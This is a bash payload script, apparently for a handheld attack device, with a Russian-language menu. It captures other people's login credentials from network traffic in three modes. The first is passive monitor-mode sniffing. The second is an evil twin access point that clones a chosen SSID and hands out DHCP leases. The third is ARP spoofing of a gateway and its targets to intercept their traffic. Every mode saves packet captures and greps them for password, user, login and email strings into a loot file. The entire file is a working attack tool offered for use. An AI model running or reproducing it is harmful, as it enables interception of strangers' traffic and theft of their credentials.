#!/bin/bash
. /root/payloads/library/nullsec-ui.sh
# Title: Credential Sniffer
# Author: bad-antics
# Description: Пассивный захват учётных данных из сетевого трафика
# Category: nullsec/capture

# Autodetect the right wireless interface (exports $IFACE).
# Falls back to showing the pager error dialog if nothing is plugged in.
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

PROMPT "СНИФФЕР УЧЕТОК

Пассивно собирает
учетные данные из:

- HTTP форм
- FTP логинов
- SMTP/POP/IMAP
- Telnet сессий

Нажмите ОК для продолжения."

INTERFACE="$IFACE"

PROMPT "РЕЖИМ СНИФФИНГА:

1. Монитор (пассивно)
2. Evil Twin + Сниф
3. ARP Spoof + Сниф

Режим 1 = скрытный
Режим 2/3 = активный

Выберите режим."

SNIFF_MODE=$(NUMBER_PICKER "Режим (1-3):" 1)

LOOT_DIR="/mmc/nullsec/creds"
mkdir -p "$LOOT_DIR"
LOOT_FILE="$LOOT_DIR/creds_$(date +%Y%m%d_%H%M%S).txt"

echo "Журнал сниффера учетных данных" > "$LOOT_FILE"
echo "Дата: $(date)" >> "$LOOT_FILE"
echo "Режим: $SNIFF_MODE" >> "$LOOT_FILE"
echo "---" >> "$LOOT_FILE"

DURATION=$(NUMBER_PICKER "Длительность (мин):" 5)
DURATION_SEC=$((DURATION * 60))

case $SNIFF_MODE in
    1) # Passive monitor
        airmon-ng check kill 2>/dev/null
        airmon-ng start $INTERFACE >/dev/null 2>&1
        MON_IF="${INTERFACE}mon"
        [ ! -d "/sys/class/net/$MON_IF" ] && MON_IF="$INTERFACE"
        
        LOG "Пассивный сниффинг..."
        SPINNER_START "Сниффинг трафика..."
        
        # Capture packets with credential patterns
        timeout $DURATION_SEC tcpdump -i $MON_IF -w "$LOOT_DIR/capture_$$.pcap" 2>/dev/null &
        
        sleep $DURATION_SEC
        
        SPINNER_STOP
        airmon-ng stop $MON_IF 2>/dev/null
        
        # Parse for creds
        if [ -f "$LOOT_DIR/capture_$$.pcap" ]; then
            # Look for HTTP POST
            strings "$LOOT_DIR/capture_$$.pcap" | grep -iE "pass=|password=|pwd=|user=|login=|email=" >> "$LOOT_FILE"
            
            CRED_COUNT=$(wc -l < "$LOOT_FILE")
            PROMPT "СНИФФИНГ ЗАВЕРШЕН

Собрано за ${DURATION} мин
Найдено примерно ~$CRED_COUNT соответствий

PCAP сохранен для анализа.
Проверьте $LOOT_FILE

Нажмите ОК для выхода."
        fi
        ;;
        
    2) # Evil Twin mode
        PROMPT "РЕЖИМ EVIL TWIN

Создаст фальшивую точку доступа
и будет сниффить весь трафик.

Введите SSID цели."
        
        TARGET_SSID=$(TEXT_PICKER "SSID для клонирования:" "Free_WiFi")
        
        # Create hostapd config
        cat > /tmp/hostapd_sniff.conf << HOSTAPD_EOF
interface=$INTERFACE
driver=nl80211
ssid=$TARGET_SSID
channel=6
hw_mode=g
HOSTAPD_EOF
        
        LOG "Запуск Evil Twin..."
        SPINNER_START "Запуск злого AP и сниффера..."
        
        hostapd /tmp/hostapd_sniff.conf &
        HOSTAPD_PID=$!
        
        sleep 2
        
        # Start dhcp
        dnsmasq --interface=$INTERFACE --dhcp-range=192.168.4.2,192.168.4.100,12h --no-daemon &
        DNSMASQ_PID=$!
        
        # Sniff
        tcpdump -i $INTERFACE -w "$LOOT_DIR/eviltwin_$$.pcap" 2>/dev/null &
        TCPDUMP_PID=$!
        
        sleep $DURATION_SEC
        
        kill $TCPDUMP_PID $HOSTAPD_PID $DNSMASQ_PID 2>/dev/null
        SPINNER_STOP
        
        # Parse
        strings "$LOOT_DIR/eviltwin_$$.pcap" | grep -iE "pass|user|login|email" >> "$LOOT_FILE"
        
        PROMPT "EVIL TWIN ЗАВЕРШЕН

Длительность: ${DURATION} мин
SSID: $TARGET_SSID

Проверьте $LOOT_FILE
на наличие захваченных учетных данных.

Нажмите ОК для выхода."
        ;;
        
    3) # ARP Spoof mode
        PROMPT "РЕЖИМ ARP SPOOF

Требуется подключение
к целевой сети.

Введите IP шлюза."
        
        GATEWAY=$(TEXT_PICKER "IP шлюза:" "192.168.1.1")
        TARGET_IP=$(TEXT_PICKER "IP цели (или ALL):" "ALL")
        
        LOG "Запуск ARP подмены..."
        SPINNER_START "ARP-подмена и сниффинг..."
        
        echo 1 > /proc/sys/net/ipv4/ip_forward
        
        if [ "$TARGET_IP" = "ALL" ]; then
            arpspoof -i $INTERFACE -t $GATEWAY >/dev/null 2>&1 &
        else
            arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY >/dev/null 2>&1 &
            arpspoof -i $INTERFACE -t $GATEWAY $TARGET_IP >/dev/null 2>&1 &
        fi
        
        ARPSPOOF_PID=$!
        
        tcpdump -i $INTERFACE -w "$LOOT_DIR/arpspoof_$$.pcap" port 80 or port 21 or port 23 or port 110 or port 143 2>/dev/null &
        TCPDUMP_PID=$!
        
        sleep $DURATION_SEC
        
        kill $TCPDUMP_PID 2>/dev/null
        killall arpspoof 2>/dev/null
        echo 0 > /proc/sys/net/ipv4/ip_forward
        
        SPINNER_STOP
        
        strings "$LOOT_DIR/arpspoof_$$.pcap" | grep -iE "pass|user|login" >> "$LOOT_FILE"
        
        PROMPT "ARP ПОДМЕНА ЗАВЕРШЕНА

Длительность: ${DURATION} мин
Шлюз: $GATEWAY

Проверьте $LOOT_FILE
на наличие захваченных учетных данных.

Нажмите ОК для выхода."
        ;;
esac
